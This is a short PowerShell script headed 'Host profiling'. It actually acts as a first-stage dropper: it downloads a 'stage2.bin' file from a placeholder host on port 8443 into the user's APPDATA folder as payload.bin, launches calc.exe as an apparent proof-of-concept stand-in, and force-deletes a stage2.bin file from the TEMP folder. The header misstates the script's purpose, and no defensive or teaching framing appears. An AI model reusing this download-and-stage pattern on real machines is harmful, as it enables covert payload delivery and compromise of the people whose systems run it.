<# Host profiling #>
[CmdletBinding()]
param(
    [string]$TransferUrl = 'https://example.net:8443/cdn/stage2.bin',
    [string]$OutputPath = "$env:APPDATA\payload.bin"
)
(New-Object System.Net.WebClient).DownloadFile($TransferUrl, $OutputPath)
Start-Process -FilePath 'calc.exe' -ErrorAction SilentlyContinue
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
